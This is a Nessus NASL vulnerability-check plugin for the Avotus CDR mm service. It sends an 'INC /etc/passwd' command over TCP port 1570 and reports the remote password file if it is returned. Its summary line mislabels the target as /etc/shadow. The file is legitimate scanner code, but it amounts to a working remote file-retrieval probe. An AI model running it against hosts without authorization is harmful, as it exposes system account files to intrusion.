#
# See the Nessus Scripts License for details
#
#
#---------------------------------------------------------------------------
# This plugin has not been verified - meaning that there MIGHT be no
# flaw in the mentionned product.
#

if(description)
{
 script_id(11948);
 script_version ("$Revision: 1.4 $");
 name["english"] = "Avotus mm File Retrieval attempt";
 script_name(english:name["english"]);
 
 desc["english"] = "
The script attempts to force the remote Avotus CDR mm service to include 
the file /etc/passwd accross the network.

Solution : The vendor has provided a fix for this issue to all customers. 
The fix will be included in future shipments and future versions of the product.
If an Avotus customer has any questions about this problem, they should contact
support@avotus.com.

Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Retrieves /etc/shadow";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"Anonymous");
		
 family["english"] = "Remote file access";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes");
 script_require_ports(1570, "Services/avotus_mm");
 
 exit(0);
}

#
# The script code starts here
#

include("misc_func.inc");

cmd = string("INC /etc/passwd\n");


port = get_kb_item("Services/avotus_mm");
if(!port)port = 1570;
if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  send(socket:soc, data:cmd);
  res = recv(socket:soc, length:65535);
  if(egrep(pattern:"root:.*:0:[01]:", string:res))
   {
    report =  "
The Avotus CDR mm service allows any file to be retrieved remotely.
Here is an excerpt from the remote /etc/passwd file : 
" + res + "

Solution : disable this service
Risk factor : High";

   security_hole(port:port, data:report);
   }
  close(soc);
  }
}

